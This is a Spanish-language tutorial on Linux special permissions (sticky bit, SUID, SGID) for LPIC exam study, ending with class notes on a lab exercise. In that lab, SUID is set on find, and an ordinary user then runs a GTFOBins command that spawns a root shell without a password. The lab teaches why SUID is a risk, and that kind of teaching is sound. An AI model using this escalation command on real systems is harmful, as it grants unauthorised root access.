Permisos especiales en Linux: Sticky Bit, SUID y SGID
POR DAVIDOCHOBITS · 17 JUNIO, 2019


 
Existen una serie de permisos especiales en GNU/Linux, que, aunque no son habituales, es necesarios saberlos, 
por ejemplo, para trabajar en grupo sobre ciertos directorios o bien si deseamos sacarnos en algún momento los certificados de LPIC

Respecto a los exámenes de LPIC, justo estoy en ello, por eso los últimos artículos en la web son tan técnicos, 
ya que se tratan de áreas que salen en dichos exámenes y me sirven para refrescar conocimientos.

@@@@Permisos especiales en Linux
    #sticky bit
    Se trata de un permiso de acceso que puede ser asignado a ficheros y directorios en sistemas UNIX y similares. 
    Aunque históricamente su fin eran otro, actualmente el sticky bit se utiliza sobre directorios.

    Cuando se le asigna a un directorio, significa que los elementos que hay en ese directorio solo pueden ser renombrados o 
    borrados por su propietario o bien por root. El resto de usuarios que tengan permisos de lectura y escritura, 
    los podrán leer y modificar, pero no borrar.

    El sticky bit comúnmente es utilizado para “/tmp”

    Este tipo de permisos sobre un directorio se puede otorgar de varias maneras:

    1
        chmod 1775 test
        O bien


    2
        chmod +t /test #para activar sticky bit
        chmod -t /test #para desactivar sticky bit
        Si un usuario intenta borrar un fichero de una carpeta con sticky bit, recibierá el siguiente mensaje:



            [david@servcentos]$ rm -rf hola
            rm: cannot remove ‘hola’: Operation not permitted

 
    #SUID
        Cuando se activa el bit SUID sobre un fichero significa que el que lo ejecute va a tener los mismos permisos que 
        el que creó el archivo. Esto es útil en algunas ocasiones, aunque hay que utilizarlo con cuidado, ya que puede acarrear 
        problemas de seguridad

        Para activarlo:


            [david@servcentos test]$ chmod 4775 hello.sh
            [david@servcentos test]$ ls -l hello.sh
            -rwsrwxr-x 1 david david 26 Jun 11 19:02 hello.sh
            [david@servcentos test]$ chmod -x hello.sh
            [david@servcentos]$ ls -l hello.sh
            -rwSrw-r-- 1 david david 26 Jun 12 19:02 hello.sh
        
        Observamos que en la última línea le quitamos el servicio de ejecución al archivo y en los permisos se reemplaza la s 
        minúscula por la S mayúsculas.

    #SGID
        El bit SGID es lo mismo que SUID, pero a nivel de grupo. Esto es, todo archivo que tenga activo el SGID, al ser ejecutado, 
        tendrás los privilegios del grupo al que pertenece.

        Opción bastante útil si queremos configurar un directorio para colaborar diferentes usuarios. Si se aplica este bit al directorio, 
        cualquier archivo creado en dicho directorio, tendrá asignado el grupo al que pertenece el directorio

        Por ejemplo, si un usuario que tiene permiso de escritura en el directorio crea un archivo allí, ese archivo es un miembro del 
        mismo grupo que el directorio y no el grupo del usuario. Como hemos dicho, esto es muy útil en la creación de directorios compartidos.


            chmod g+s "directorio"
            En el caso de un fichero:

            1
            chmod 2555 "fichero"

-------------- CONTINUACION CLASE -----------------

    1= Entramos como root y asignamos un permiso SUID al comando find.
        # Para ver la ruta del comando find escribimos lo siguiente:
            which find
        # Y para ver los permisos de find escribimos:
            which find | xargs ls -la
        # Para asignar un SUID debemos incluir un 4 a la izquierda de los permisos, en este caso find tiene unos permisos de 755 por que en total seria 4755.
            chmod 4755 /usr/bin/find
        # Ahora en los permisos de propietario nos debe salir una "s" en ved "x"
    2= Entramos con el usuario pepito:
        # Entramos en la pagina https://gtfobins.github.io/ con informacion de explotacion de privilegios.
        # Una ved hemos buscado en la web, la vulnerabilidad SUID de find copiamos y pegamos en consola:
            find . -exec /bin/sh -p \; -quit
        # Ahora somos root sin proporcionar la contraseña.